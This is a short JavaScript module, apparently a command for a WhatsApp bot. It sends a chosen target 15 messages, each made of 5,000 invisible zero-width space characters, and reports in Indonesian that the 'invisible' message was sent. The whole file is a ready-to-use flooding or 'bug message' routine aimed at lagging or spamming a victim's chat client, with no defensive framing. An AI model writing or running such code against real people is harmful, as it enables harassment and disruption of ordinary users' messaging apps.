async function invisible(sock, target) {
    const invisibleChar = '\u200B'.repeat(5000);
    for (let i = 0; i < 15; i++) {
        await sock.sendMessage(target, { text: invisibleChar });
    }
    return '✅ Invisible dikirim';
}
module.exports = invisible;
